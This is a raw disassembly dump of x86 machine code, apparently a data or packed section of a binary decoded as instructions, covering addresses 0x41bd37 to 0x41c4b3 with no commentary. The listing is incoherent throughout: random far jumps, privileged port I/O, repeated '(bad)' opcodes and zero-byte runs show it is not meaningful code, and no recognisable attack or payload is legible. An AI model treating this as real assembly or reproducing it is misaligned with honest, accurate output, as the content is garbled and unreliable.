  41bd37:	shr    dh,0xe6
  41bd3a:	xchg   ebx,eax
  41bd3b:	ret    
  41bd3c:	xchg   esp,eax
  41bd3d:	pop    esp
  41bd3e:	xchg   ebx,eax
  41bd3f:	jmp    0x41bd2d
  41bd41:	in     al,dx
  41bd42:	and    eax,0x57c1df56
  41bd47:	jmp    FWORD PTR [edi+0x1a]
  41bd4a:	jl     0x41bd4c
  41bd4c:	addr16 cmp al,BYTE PTR [bx+di+0x19d4]
  41bd52:	fwait
  41bd53:	out    dx,al
  41bd54:	or     eax,DWORD PTR [eax+ebx*4-0x103e8b8d]
  41bd5b:	adc    cl,al
  41bd5d:	sub    edx,DWORD PTR [edx+0x0]
  41bd60:	or     esp,edx
  41bd62:	xchg   esp,eax
  41bd63:	fdivr  DWORD PTR [ebp+0x39c00418]
  41bd69:	sub    al,0x11
  41bd6b:	add    BYTE PTR [eax+0x4388e4f3],dl
  41bd71:	inc    ebx
  41bd72:	xchg   ebx,eax
  41bd73:	int3   
  41bd74:	pop    ss
  41bd75:	mov    bl,0x3d
  41bd77:	inc    edi
  41bd78:	mov    ah,0xbf
  41bd7a:	imul   ebx
  41bd7c:	mov    al,ds:0x903f6c9
  41bd81:	jle    0x41bd7a
  41bd83:	mov    WORD PTR [eax],es
  41bd85:	add    BYTE PTR [eax],al
  41bd87:	add    BYTE PTR [eax],al
  41bd89:	test   DWORD PTR [edx+ecx*8+0x1e39f834],ebx
  41bd90:	add    edx,DWORD PTR [eax+0x438a083b]
  41bd96:	into   
  41bd97:	mov    edi,0x7bb7c186
  41bd9c:	fcmove st,st(7)
  41bd9e:	daa    
  41bd9f:	clc    
  41bda0:	lds    edx,FWORD PTR [ebx-0x32]
  41bda3:	in     al,dx
  41bda4:	add    al,0x11
  41bda6:	sub    ch,bl
  41bda8:	pop    ecx
  41bda9:	inc    esi
  41bdaa:	pushf  
  41bdab:	aaa    
  41bdac:	xchg   ecx,eax
  41bdad:	inc    ebx
  41bdae:	into   
  41bdaf:	jmp    0x41bded
  41bdb1:	mov    eax,0x9004c014
  41bdb6:	xor    eax,0x1a64280c
  41bdbb:	xlat   BYTE PTR ds:[ebx]
  41bdbc:	fisttp WORD PTR [edi+0x3c47427]
  41bdc2:	fdiv   st,st(4)
  41bdc4:	xchg   esi,eax
  41bdc5:	ror    esi,cl
  41bdc7:	(bad)  
  41bdc8:	xor    ecx,DWORD PTR [ebx]
  41bdca:	outs   dx,BYTE PTR ds:[esi]
  41bdcb:	fistp  DWORD PTR [edi]
  41bdcd:	shl    BYTE PTR ds:0x82b42834,0x72
  41bdd4:	dec    eax
  41bdd5:	mov    ah,0x7e
  41bdd7:	adc    DWORD PTR [eax+eax*8],edx
  41bdda:	sbb    cl,BYTE PTR [ebx+edi*2+0x4e]
  41bdde:	daa    
  41bddf:	jns    0x41bda9
  41bde1:	mov    ds:0x8c59382d,eax
  41bde6:	cmp    ebx,esp
  41bde8:	daa    
  41bde9:	ins    BYTE PTR es:[edi],dx
  41bdea:	xor    eax,0x27bc
  41bdef:	add    BYTE PTR [eax],al
  41bdf1:	add    al,bl
  41bdf3:	fisttp DWORD PTR [edi-0x15]
  41bdf6:	xchg   ecx,eax
  41bdf7:	jecxz  0x41be07
  41bdf9:	or     eax,DWORD PTR ss:[ebx-0x5bf52ece]
  41be00:	push   cs
  41be01:	push   0xffffffd6
  41be03:	sbb    DWORD PTR [edx],edx
  41be05:	push   ss
  41be06:	adc    eax,0x9ac932ab
  41be0b:	mov    ds:0x399d970e,eax
  41be10:	push   ebx
  41be11:	int    0xef
  41be13:	cmp    ebp,eax
  41be15:	jb     0x41bdab
  41be17:	das    
  41be18:	pop    ebx
  41be19:	int    0xab
  41be1b:	cmp    edi,edx
  41be1d:	add    ebp,edi
  41be1f:	sbb    cl,BYTE PTR [edi]
  41be21:	jmp    0xf2a6253d
  41be26:	sbb    ah,BYTE PTR [esi+ecx*1+0x2ece376a]
  41be2d:	jmp    0x7245d344
  41be32:	push   edi
  41be33:	into   
  41be34:	or     dh,BYTE PTR [edx+0x5f]
  41be37:	into   
  41be38:	push   es
  41be39:	bound  edx,QWORD PTR [ebx+0x640552d9]
  41be3f:	mov    cl,0xbe
  41be41:	jo     0x41be0a
  41be43:	into   
  41be44:	push   es
  41be45:	fs pop ebp
  41be47:	mov    ds:0xced76224,al
  41be4c:	or     bl,BYTE PTR [ecx+ecx*8-0x3f]
  41be50:	cdq    
  41be51:	jmp    0x24542410
  41be56:	add    BYTE PTR [eax],al
  41be58:	add    BYTE PTR [eax],al
  41be5a:	add    BYTE PTR [edx+eax*4-0x3157d267],cl
  41be61:	aas    
  41be62:	jmp    0xbcbf:0xfced7651
  41be69:	dec    esi
  41be6a:	jmp    0x645cb081
  41be6f:	xlat   BYTE PTR ds:[ebx]
  41be70:	into   
  41be71:	push   esi
  41be72:	dec    esi
  41be73:	(bad)  
  41be75:	add    BYTE PTR cs:[ecx],cl
  41be78:	add    eax,0x5992462
  41be7d:	add    DWORD PTR [edi+edi*1+0x72],ebx
  41be81:	push   cs
  41be82:	sub    DWORD PTR [ebp-0x4b],0xffffff97
  41be86:	inc    esp
  41be87:	frstor ds:0xb9821578
  41be8d:	aas    
  41be8e:	mov    edi,DWORD PTR [edi-0x6eff9eca]
  41be94:	xor    al,0xf9
  41be96:	add    cl,bh
  41be98:	cmp    dh,bl
  41be9a:	mov    DWORD PTR ds:0x7b8506ce,ebp
  41bea0:	mov    ah,0x91
  41bea2:	or     esp,esi
  41bea4:	pop    es
  41bea5:	jmp    0x41be32
  41bea7:	add    dl,BYTE PTR [edi]
  41bea9:	mov    esp,ebp
  41beab:	mov    ecx,0x8d4498b1
  41beb0:	pop    ds
  41beb1:	dec    ebx
  41beb2:	pop    esi
  41beb3:	fs jmp 0x41be45
  41beb6:	les    eax,FWORD PTR [ebp-0xd]
  41beb9:	mov    gs,esp
  41bebb:	mov    ebp,0x5c97e2
  41bec0:	add    BYTE PTR [eax],al
  41bec2:	add    BYTE PTR [eax],al
  41bec4:	(bad)  
  41bec5:	(bad)  
  41bec6:	inc    ecx
  41bec7:	mov    edx,DWORD PTR [ebp-0x26]
  41beca:	ss push esi
  41becc:	add    bh,BYTE PTR [esi+0xe]
  41becf:	push   edi
  41bed0:	add    cl,ah
  41bed2:	pop    ebx
  41bed3:	mov    DWORD PTR [ebp-0x6a76d126],edi
  41bed9:	fimul  DWORD PTR [edx]
  41bedb:	add    edx,DWORD PTR [edi]
  41bedd:	sbb    DWORD PTR [edi+0x1],edx
  41bee0:	jns    0x41be93
  41bee2:	mov    ?,WORD PTR [esi]
  41bee4:	dec    esp
  41bee5:	mov    dh,0x91
  41bee7:	inc    ecx
  41bee8:	push   0x78a0eb1
  41beed:	mov    al,0x8e
  41beef:	stc    
  41bef0:	test   eax,0x903590b7
  41bef5:	sbb    dl,BYTE PTR [edx]
  41bef7:	add    BYTE PTR [eax],dl
  41bef9:	or     BYTE PTR [ecx],0xd
  41befc:	pop    ss
  41befd:	mov    edi,0x98900011
  41bf02:	jbe    0x41bf28
  41bf04:	test   BYTE PTR [ebx],bl
  41bf06:	popf   
  41bf07:	inc    ebp
  41bf08:	pop    ss
  41bf09:	xchg   edx,eax
  41bf0a:	push   esi
  41bf0b:	and    al,0xa8
  41bf0d:	mov    al,ds:0x1b4d88a2
  41bf12:	test   DWORD PTR [ecx],0x73350110
  41bf18:	mov    DWORD PTR [esi+edx*2+0x7618424],esi
  41bf1f:	ret    0x295e
  41bf22:	les    eax,FWORD PTR [ebx-0x4c]
  41bf25:	pop    es
  41bf26:	adc    DWORD PTR [eax+eax*1+0x0],esi
  41bf2a:	add    BYTE PTR [eax],al
  41bf2c:	add    BYTE PTR [eax+esi*8-0x2d],dh
  41bf30:	add    BYTE PTR [ebx+0x3c8924eb],dl
  41bf36:	scas   eax,DWORD PTR es:[edi]
  41bf37:	xor    dl,BYTE PTR [esi-0x41]
  41bf3a:	and    eax,0x1b50162e
  41bf3f:	pop    ebx
  41bf41:	pushf  
  41bf42:	in     al,dx
  41bf43:	push   ss
  41bf44:	dec    ebp
  41bf45:	mov    ecx,0x90001202
  41bf4a:	fwait
  41bf4b:	enter  0x1d2f,0xf
  41bf4f:	inc    esi
  41bf51:	jnp    0x41bf54
  41bf53:	call   0xb44b:0x96fdac4b
  41bf5a:	sbb    eax,0xfdac539d
  41bf5f:	rol    DWORD PTR [ebx-0x4c],cl
  41bf62:	data16 adc ch,al
  41bf65:	pop    ebx
  41bf66:	sub    eax,0x520b0012
  41bf6b:	(bad)  
  41bf6c:	not    BYTE PTR [ecx-0x6f4261fc]
  41bf72:	mov    dl,0xf7
  41bf74:	add    ecx,DWORD PTR [ecx-0x72d3ec8a]
  41bf7a:	das    
  41bf7b:	mov    WORD PTR [ebx],es
  41bf7d:	nop
  41bf7e:	mov    dl,0x70
  41bf80:	aaa    
  41bf81:	je     0x41bf55
  41bf83:	pusha  
  41bf84:	pop    es
  41bf85:	pop    edx
  41bf86:	cmp    ah,bl
  41bf88:	leave  
  41bf89:	xchg   ebx,eax
  41bf8a:	aaa    
  41bf8b:	mov    ah,0x27
  41bf8d:	xlat   BYTE PTR fs:[ebx]
  41bf8f:	dec    edi
  41bf90:	add    BYTE PTR [eax],al
  41bf92:	add    BYTE PTR [eax],al
  41bf94:	add    BYTE PTR [eax],al
  41bf96:	fdiv   DWORD PTR [edi]
  41bf98:	sub    ebp,ebx
  41bf9a:	xchg   esp,eax
  41bf9b:	push   ss
  41bf9c:	clc    
  41bf9d:	add    ecx,DWORD PTR [ecx]
  41bf9f:	sub    edi,DWORD PTR [ebx-0x12]
  41bfa2:	cmp    DWORD PTR [edx+0x2e9cdc72],0x57
  41bfa9:	add    edx,DWORD PTR [eax+0x8b660b2]
  41bfaf:	hlt    
  41bfb0:	paddw  mm1,QWORD PTR [edx+0x7888f7b1]
  41bfb7:	aaa    
  41bfb8:	mov    al,ds:0xf924d287
  41bfbd:	in     al,dx
  41bfbe:	push   ss
  41bfbf:	ja     0x41bfdc
  41bfc1:	lock js 0x41bf9b
  41bfc4:	inc    ebp
  41bfc5:	and    DWORD PTR [ecx],ebx
  41bfc7:	outs   dx,DWORD PTR ds:[esi]
  41bfc8:	sbb    edx,DWORD PTR [ecx+ebx*1]
  41bfcb:	(bad)  
  41bfcc:	pusha  
  41bfcd:	or     al,0x17
  41bfcf:	ja     0x41bfec
  41bfd1:	cld    
  41bfd2:	or     bl,bh
  41bfd4:	iret   
  41bfd5:	cmc    
  41bfd6:	js     0x41bf8a
  41bfd8:	idiv   DWORD PTR [edi+0x47]
  41bfdb:	sahf   
  41bfdc:	add    ecx,DWORD PTR [edi-0x7138311d]
  41bfe2:	xchg   ecx,eax
  41bfe3:	xlat   BYTE PTR ds:[ebx]
  41bfe4:	xor    esp,DWORD PTR [eax]
  41bfe6:	mov    BYTE PTR [edi+0x3793ef67],ch
  41bfec:	add    al,0x20
  41bfee:	mov    al,ds:0xc0840f2d
  41bff3:	fcomp  DWORD PTR [ecx+0x107518eb]
  41bff9:	adc    al,BYTE PTR [eax]
  41bffb:	add    BYTE PTR [eax],al
  41bffd:	add    BYTE PTR [eax],al
  41bfff:	dec    ebp
  41c000:	mov    dl,0x11
  41c002:	mov    ecx,0xf1326f0e
  41c007:	jl     0x41bfba
  41c009:	aam    0xb9
  41c00b:	dec    edx
  41c00c:	sar    BYTE PTR [edx-0x21],0xd3
  41c010:	mov    dl,0x91
  41c012:	and    eax,0xd632588
  41c017:	and    BYTE PTR [esi+0x44],bh
  41c01a:	add    DWORD PTR cs:[edi+0x3193a904],eax
  41c021:	shr    ebp,cl
  41c023:	push   cs
  41c024:	div    dh
  41c026:	fsubrp st(6),st
  41c028:	and    ch,dh
  41c02a:	bound  edx,QWORD PTR [eax-0x32]
  41c02d:	add    dh,BYTE PTR [ecx-0x5a65dd72]
  41c033:	jg     0x41c017
  41c035:	xchg   edi,eax
  41c036:	ret    0xdb06
  41c039:	pop    ebp
  41c03a:	jmp    0x1da7:0x2ff739e8
  41c041:	push   ds
  41c042:	imul   ebp,eax,0x24
  41c045:	out    dx,al
  41c046:	(bad)  
  41c047:	and    esp,DWORD PTR [ecx*2-0x6e7696d1]
  41c04e:	lods   eax,DWORD PTR ds:[esi]
  41c04f:	mov    bh,0xf0
  41c051:	(bad)  
  41c052:	call   0xbc3bb2dc
  41c057:	push   es
  41c058:	div    dh
  41c05a:	jmp    0x335e:0x92ee227e
  41c061:	sti    
  41c062:	leave  
  41c063:	add    BYTE PTR [eax],al
  41c065:	add    BYTE PTR [eax],al
  41c067:	add    BYTE PTR [esi],cl
  41c069:	xchg   BYTE PTR [edx],dh
  41c06b:	fnstsw WORD PTR [esi+0x1f364485]
  41c071:	sahf   
  41c072:	xor    al,BYTE PTR [eax]
  41c074:	mov    ecx,0xad891490
  41c079:	rol    BYTE PTR [esi],cl
  41c07b:	mov    ebp,DWORD PTR [esi]
  41c07d:	loope  0x41c076
  41c07f:	push   ds
  41c080:	mov    dl,0xc6
  41c082:	daa    
  41c083:	repz imul ebp,DWORD PTR [edx],0x27
  41c087:	repnz pushw ds
  41c08a:	je     0x41c017
  41c08c:	call   0xf56534b2
  41c091:	shr    DWORD PTR [edx],0x66
  41c094:	xchg   edx,eax
  41c095:	jb     0x41c0c9
  41c097:	cmp    al,0xe5
  41c099:	adc    DWORD PTR [edi],esi
  41c09b:	(bad)  
  41c09c:	sub    ch,ah
  41c09e:	ror    DWORD PTR es:[edx+0x5c],cl
  41c0a2:	and    al,al
  41c0a4:	into   
  41c0a5:	fisttp DWORD PTR [ecx+0x5b]
  41c0a8:	push   0x61
  41c0aa:	push   cs
  41c0ab:	ret    0xb5fd
  41c0ae:	pop    ds
  41c0af:	shl    BYTE PTR [edx+0xb],0x99
  41c0b3:	push   edi
  41c0b4:	not    eax
  41c0b6:	test   DWORD PTR [ecx-0x76f93dcb],0x890ac1f5
  41c0c0:	dec    ebp
  41c0c1:	ror    DWORD PTR [esi+0x74],0xc3
  41c0c5:	lods   eax,DWORD PTR ss:[esi]
  41c0c7:	push   es
  41c0c8:	inc    edx
  41c0c9:	push   ecx
  41c0ca:	imul   dl
  41c0cc:	add    BYTE PTR [eax],al
  41c0ce:	add    BYTE PTR [eax],al
  41c0d0:	add    bl,dl
  41c0d2:	mov    dh,0xe
  41c0d4:	mov    esp,ecx
  41c0d6:	das    
  41c0d7:	push   edx
  41c0d8:	and    al,0xc5
  41c0da:	sub    al,0x4a
  41c0dc:	and    al,0x75
  41c0de:	das    
  41c0df:	cmp    BYTE PTR cs:[edx],dh
  41c0e2:	mov    esi,0x2c754097
  41c0e7:	push   0x24
  41c0e9:	push   ebp
  41c0ea:	sub    al,0x52
  41c0ec:	and    al,0x49
  41c0ee:	mov    al,ds:0x1e9074c6
  41c0f3:	xchg   ebp,eax
  41c0f4:	push   ebx
  41c0f5:	mov    ah,0xcb
  41c0f7:	xchg   ebp,eax
  41c0f8:	dec    ebx
  41c0f9:	lods   al,BYTE PTR ds:[esi]
  41c0fa:	iret   
  41c0fb:	cli    
  41c0fc:	jo     0x41c15a
  41c0fe:	mov    al,ds:0xefe488c7
  41c103:	push   ecx
  41c104:	mov    esp,ebp
  41c106:	imul   DWORD PTR ds:0x9ff3583
  41c10c:	sbb    DWORD PTR [ebx+0x10],0x6e
  41c110:	jg     0x41c0a3
  41c112:	or     edx,DWORD PTR [edx]
  41c114:	mov    DWORD PTR [edi+esi*4-0x502b7702],esp
  41c11b:	out    0x8a,al
  41c11d:	aam    0xb7
  41c11f:	push   edx
  41c120:	push   eax
  41c121:	add    eax,0x60480e4f
  41c126:	dec    eax
  41c127:	(bad)  
  41c128:	jae    0x41c0d6
  41c12a:	dec    edi
  41c12b:	fwait
  41c12c:	aad    0xe8
  41c12e:	test   ch,al
  41c130:	cld    
  41c131:	not    DWORD PTR [ebx+0x2426]
  41c137:	add    BYTE PTR [eax],al
  41c139:	add    BYTE PTR [edi+edx*4-0x2e],dl
  41c13d:	or     al,0xc
  41c13f:	inc    ecx
  41c140:	adc    DWORD PTR [eax],eax
  41c142:	nop
  41c143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c144:	jbe    0x41c16a
  41c146:	push   eax
  41c147:	mov    ah,0xe
  41c149:	mov    DWORD PTR [edi+esi*8+0x1d],eax
  41c14d:	adc    dx,WORD PTR [edi+0x10883c2e]
  41c154:	ins    DWORD PTR es:[edi],dx
  41c155:	fst    DWORD PTR [eax+0x6f6a120b]
  41c15b:	jle    0x41c19a
  41c15d:	and    al,0x74
  41c15f:	sar    dl,cl
  41c161:	test   DWORD PTR fs:[edx],ecx
  41c164:	adc    cl,BYTE PTR [ecx-0x751950bc]
  41c16a:	in     al,0xb5
  41c16c:	cmp    ch,al
  41c16e:	addr16 mov bl,0x9a
  41c171:	add    edx,DWORD PTR [eax+0x5014b02b]
  41c177:	xor    al,0x85
  41c179:	ficomp DWORD PTR [esi+esi*2-0x29147581]
  41c180:	sar    DWORD PTR [esi+0x5c],cl
  41c183:	mov    al,0x5f
  41c185:	repnz push esi
  41c187:	and    al,bh
  41c189:	sbb    al,0xcc
  41c18b:	(bad)  
  41c18c:	lahf   
  41c18d:	or     BYTE PTR [ecx],dl
  41c18f:	mov    eax,0x2b9003f6
  41c194:	hlt    
  41c195:	fldcw  WORD PTR [eax+0x76]
  41c198:	inc    ebp
  41c199:	call   DWORD PTR [eax+0x241376]
  41c19f:	add    BYTE PTR [eax],al
  41c1a1:	add    BYTE PTR [eax],al
  41c1a3:	xchg   ecx,eax
  41c1a4:	cmc    
  41c1a5:	pop    esi
  41c1a6:	aas    
  41c1a7:	je     0x41c21f
  41c1a9:	mov    ds:0x1b770909,al
  41c1ae:	lock sbb BYTE PTR [ebx-0x21],ch
  41c1b2:	jmp    0x41c17d
  41c1b4:	gs clc 
  41c1b6:	add    ebp,ecx
  41c1b8:	cdq    
  41c1b9:	pusha  
  41c1ba:	retf   
  41c1bb:	out    dx,eax
  41c1bc:	push   ecx
  41c1bd:	lsl    edx,WORD PTR [eax-0x57e04bd7]
  41c1c4:	xor    eax,0x4140838
  41c1c9:	clc    
  41c1ca:	add    edx,DWORD PTR [eax+0x18d9ac1f]
  41c1d0:	ficomp WORD PTR [ebx-0xb4d780f]
  41c1d6:	push   eax
  41c1d7:	je     0x41c1a3
  41c1d9:	daa    
  41c1da:	xlat   BYTE PTR ds:[ebx]
  41c1db:	fsubr  QWORD PTR [ebx]
  41c1dd:	cmp    al,0x20
  41c1df:	pop    eax
  41c1e0:	xor    esi,DWORD PTR [eax+ecx*1+0x3bde719]
  41c1e7:	and    al,0xd6
  41c1e9:	rdtsc  
  41c1eb:	inc    ecx
  41c1ec:	mov    BYTE PTR [esi],cl
  41c1ee:	mov    dh,0x3f
  41c1f0:	sub    bl,BYTE PTR [ebx+0x5]
  41c1f3:	aam    0x29
  41c1f5:	push   ebx
  41c1f6:	int    0xd3
  41c1f8:	xor    ebx,edx
  41c1fa:	in     eax,dx
  41c1fb:	or     dh,BYTE PTR [ebx-0x2a]
  41c1fe:	in     eax,dx
  41c1ff:	sbb    ch,BYTE PTR [ebx+0x32]
  41c202:	leave  
  41c203:	mov    edx,0x2d11ea
  41c208:	add    BYTE PTR [eax],al
  41c20a:	add    BYTE PTR [eax],al
  41c20c:	mov    al,0xd6
  41c20e:	aas    
  41c20f:	sbb    DWORD PTR [ecx],ecx
  41c211:	mov    bl,0x3c
  41c213:	sbb    DWORD PTR [edi+0x6],esp
  41c216:	call   0x882d:0x91d2a7fd
  41c21d:	sub    DWORD PTR [ecx+eiz*1+0x24],ebx
  41c221:	add    DWORD PTR [ebx+0x542993e9],esp
  41c227:	adc    DWORD PTR [ebx],ebx
  41c229:	imul   esi,DWORD PTR [edx],0x1
  41c22c:	or     eax,0x77ad99b7
  41c231:	jbe    0x41c1ca
  41c233:	mov    eax,ds:0xe157380f
  41c238:	inc    ebp
  41c239:	jae    0x41c26d
  41c23b:	add    DWORD PTR [ebp+0x3b647509],edx
  41c241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c242:	xor    BYTE PTR [edx-0x12],ah
  41c245:	sub    DWORD PTR [ebp-0x1b],esp
  41c248:	mov    edx,0x7bf59c22
  41c24d:	sub    ebp,eax
  41c24f:	adc    DWORD PTR [eax],edi
  41c251:	pop    ss
  41c252:	psubsw mm3,QWORD PTR [edx]
  41c255:	pop    es
  41c256:	xchg   esp,eax
  41c257:	adc    ah,BYTE PTR [eax+0x69]
  41c25a:	cdq    
  41c25b:	mov    edi,0x7af6ea0a
  41c260:	mov    DWORD PTR [edi],ebx
  41c262:	out    dx,al
  41c263:	bound  edi,QWORD PTR [ebx+0x58056329]
  41c269:	sub    DWORD PTR [ebx+0x0],ebp
  41c26c:	lea    ebp,[esi-0x69]
  41c26f:	push   ss
  41c270:	add    BYTE PTR [eax],al
  41c272:	add    BYTE PTR [eax],al
  41c274:	add    BYTE PTR [edx],ch
  41c276:	icebp  
  41c277:	lsl    ebp,WORD PTR [ecx+ebp*1]
  41c27b:	fucomi st,st(0)
  41c27d:	mov    cl,0xe
  41c27f:	out    dx,al
  41c280:	(bad)  
  41c281:	in     eax,dx
  41c282:	icebp  
  41c283:	popa   
  41c284:	add    bl,BYTE PTR es:0xe1ac060f
  41c28b:	call   FWORD PTR ds:[esi+eiz*8+0x4]
  41c290:	inc    eax
  41c291:	imul   ebp,DWORD PTR [ecx],0x316e8b04
  41c297:	ror    BYTE PTR [edx+edi*1],cl
  41c29a:	arpl   sp,dx
  41c29c:	add    al,0x3b
  41c29e:	stos   DWORD PTR es:[edi],eax
  41c29f:	xchg   edi,eax
  41c2a0:	movq   mm3,mm5
  41c2a3:	sbb    BYTE PTR [ecx],al
  41c2a5:	inc    ebx
  41c2a6:	sub    ebx,DWORD PTR [eax+0x2]
  41c2a9:	mov    al,0xb7
  41c2ab:	xchg   edi,eax
  41c2ac:	retf   
  41c2ad:	shl    DWORD PTR [ebx-0xa],1
  41c2b0:	add    BYTE PTR [ecx],ch
  41c2b2:	sub    al,0x52
  41c2b4:	and    al,0x31
  41c2b6:	unpcklps xmm7,xmm6
  41c2b9:	mov    BYTE PTR [edi+ecx*4],0xec
  41c2bd:	add    eax,0xda5641e1
  41c2c2:	pop    eax
  41c2c3:	or     eax,0x43bdcd5c
  41c2c8:	mov    eax,DWORD PTR [eax-0x22dbb5d2]
  41c2ce:	mov    esi,0x9fe6484b
  41c2d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2d4:	add    ecx,ebp
  41c2d6:	mov    cl,0x1f
  41c2d8:	leave  
  41c2d9:	add    BYTE PTR [eax],al
  41c2db:	add    BYTE PTR [eax],al
  41c2dd:	add    BYTE PTR [eax],dh
  41c2df:	jne    0x41c313
  41c2e1:	sub    al,0x32
  41c2e3:	ins    BYTE PTR es:[edi],dx
  41c2e4:	push   edx
  41c2e5:	add    ebx,eax
  41c2e7:	sub    ebx,ebx
  41c2e9:	call   FWORD PTR [edi-0x56]
  41c2ec:	xchg   ebp,eax
  41c2ed:	je     0x41c27f
  41c2ef:	scas   eax,DWORD PTR es:[edi]
  41c2f0:	push   es
  41c2f1:	std    
  41c2f2:	push   ds
  41c2f3:	adc    edi,DWORD PTR [eax+0x10]
  41c2f6:	test   al,0xe9
  41c2f8:	mov    edi,0xd29797fc
  41c2fd:	or     al,0x14
  41c2ff:	fcom   DWORD PTR [ecx]
  41c301:	add    BYTE PTR [eax+0x13147490],dl
  41c307:	scas   eax,DWORD PTR es:[edi]
  41c308:	and    BYTE PTR cs:[eax-0x73db9178],dl
  41c30f:	or     edx,DWORD PTR [edi-0x3a777fa3]
  41c315:	add    eax,0xff58898f
  41c31a:	push   edi
  41c31b:	or     edx,DWORD PTR [edi-0x69008b8d]
  41c321:	add    BYTE PTR [ebx],dl
  41c323:	mov    ds:0x79120cec,eax
  41c328:	adc    al,BYTE PTR [eax]
  41c32a:	nop
  41c32b:	shr    BYTE PTR [ebp+0x1271170c],1
  41c331:	add    BYTE PTR [eax-0x6bb76504],dl
  41c337:	fst    st(1)
  41c339:	adc    eax,DWORD PTR [edi+0xfffa297]
  41c33f:	or     ecx,DWORD PTR [edi+0xf7]
  41c345:	add    BYTE PTR [eax],al
  41c347:	xchg   esi,eax
  41c348:	cld    
  41c349:	imul   eax,esp,0xffffff90
  41c34c:	or     edx,DWORD PTR [edx]
  41c34e:	adc    eax,0x9a4109d0
  41c354:	adc    al,0x6d
  41c356:	mov    eax,0x6a120b90
  41c35b:	mov    al,0x53
  41c35d:	js     0x41c367
  41c35f:	fmulp  st(1),st
  41c361:	push   cs
  41c362:	push   edi
  41c363:	lahf   
  41c364:	dec    esi
  41c365:	rol    DWORD PTR [eax+0xdf72c],1
  41c36b:	(bad)  
  41c36c:	mov    dl,0x8c
  41c36e:	ret    
  41c36f:	or     al,BYTE PTR [esi-0x77be03ed]
  41c375:	test   DWORD PTR [edx-0x770029ad],0x441da54
  41c37f:	xchg   ebp,eax
  41c380:	mov    eax,ds:0x2d9f88f3
  41c385:	xor    esi,edi
  41c387:	outs   dx,DWORD PTR ds:[esi]
  41c388:	and    ebp,eax
  41c38a:	add    edx,DWORD PTR [eax-0x3b76ccf9]
  41c390:	fisub  DWORD PTR [eax+0x42]
  41c393:	xchg   esp,eax
  41c394:	daa    
  41c395:	xor    al,0x20
  41c397:	mov    bh,al
  41c399:	add    BYTE PTR ss:[edi],dl
  41c39c:	ja     0x41c379
  41c39e:	ud2    
  41c3a0:	ja     0x41c375
  41c3a2:	neg    edi
  41c3a4:	sub    eax,0x826c203c
  41c3a9:	add    dh,BYTE PTR [ecx]
  41c3ab:	add    BYTE PTR [eax],al
  41c3ad:	add    BYTE PTR [eax],al
  41c3af:	add    BYTE PTR ds:0xe2441ba7,bh
  41c3b5:	and    DWORD PTR [eax-0x3c],0xd4440437
  41c3bc:	and    al,0x37
  41c3be:	cmp    BYTE PTR [edi-0x6d],cl
  41c3c1:	je     0x41c421
  41c3c3:	dec    edi
  41c3c4:	ins    BYTE PTR es:[edi],dx
  41c3c5:	(bad)  
  41c3c6:	pusha  
  41c3c7:	inc    edi
  41c3c8:	mov    ah,0xba
  41c3ca:	dec    edi
  41c3cb:	mov    ebp,0x9bf7b2ec
  41c3d0:	call   FWORD PTR [ebx+0x356e03f7]
  41c3d6:	mov    ecx,0x707163ff
  41c3db:	sub    al,0xa8
  41c3dd:	daa    
  41c3de:	mov    WORD PTR [edi],ds
  41c3e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3e1:	fldenv [ecx+0x60e561ff]
  41c3e7:	aas    
  41c3e8:	je     0x41c3c0
  41c3ea:	push   cs
  41c3eb:	in     al,0x93
  41c3ed:	ror    BYTE PTR [esi],cl
  41c3ef:	jmp    0x174640a
  41c3f4:	jp     0x41c378
  41c3f6:	xchg   edi,eax
  41c3f7:	and    eax,0x2b99ce78
  41c3fc:	cwde   
  41c3fd:	leave  
  41c3fe:	iret   
  41c3ff:	cmp    ebx,eax
  41c401:	mov    eax,ds:0x289e7212
  41c406:	pop    edx
  41c407:	out    0x6b,eax
  41c409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c40a:	add    eax,0x632993e9
  41c40f:	add    eax,0x6abf2a78
  41c414:	add    BYTE PTR [eax],al
  41c416:	add    BYTE PTR [eax],al
  41c418:	add    BYTE PTR [esi+0x1c],al
  41c41b:	sbb    eax,0xee1ddc6c
  41c420:	xchg   esi,eax
  41c421:	xchg   ecx,ecx
  41c423:	adc    edx,esi
  41c425:	push   ss
  41c426:	sbb    BYTE PTR ds:0xedb20ef6,dl
  41c42c:	jle    0x41c491
  41c42e:	xor    ch,BYTE PTR [ebx-0x33]
  41c431:	aaa    
  41c432:	sbb    ebx,DWORD PTR [ecx+0x64da77f5]
  41c438:	daa    
  41c439:	mov    bh,0x86
  41c43b:	push   ss
  41c43c:	rcl    DWORD PTR [ebx+0x14e5661d],cl
  41c442:	adc    al,0xec
  41c444:	jmp    0x9990cedc
  41c449:	inc    edx
  41c44a:	push   ds
  41c44b:	call   0xe2d4:0x62fa1921
  41c452:	sahf   
  41c453:	xor    cl,ch
  41c455:	jle    0x41c459
  41c457:	out    dx,al
  41c458:	popf   
  41c459:	scas   eax,DWORD PTR es:[edi]
  41c45a:	(bad)  
  41c45b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c45c:	xor    BYTE PTR [edx+esi*4+0xa93830e],dl
  41c463:	pop    eax
  41c464:	push   0xffffff95
  41c466:	mov    dl,0x99
  41c468:	add    BYTE PTR [edx-0x4618c702],ah
  41c46e:	scas   al,BYTE PTR es:[edi]
  41c46f:	xchg   edi,eax
  41c470:	dec    esp
  41c471:	aad    0xce
  41c473:	mul    BYTE PTR [esi+edx*4]
  41c476:	mov    dh,0xe
  41c478:	mul    BYTE PTR [edi+0xb62b5]
  41c47e:	add    BYTE PTR [eax],al
  41c480:	add    BYTE PTR [eax],al
  41c482:	into   
  41c483:	js     0x41c49f
  41c485:	mov    esp,DWORD PTR [edi+0x1e]
  41c488:	neg    BYTE PTR [ebp-0x74150021]
  41c48e:	gs retf 0x8b36
  41c492:	mov    ebp,0xfa403aca
  41c497:	out    dx,al
  41c498:	add    eax,0x36cab589
  41c49d:	mov    DWORD PTR [ebp-0x49c4c536],edi
  41c4a3:	(bad)  
  41c4a4:	sbb    eax,DWORD PTR [edx-0x14fb57]
  41c4aa:	repnz leave 
  41c4ac:	xor    dl,BYTE PTR [edx+ebx*1]
  41c4af:	test   BYTE PTR [edx+0x3b],0xfa
  41c4b3:	jecxz  0x41c4bc
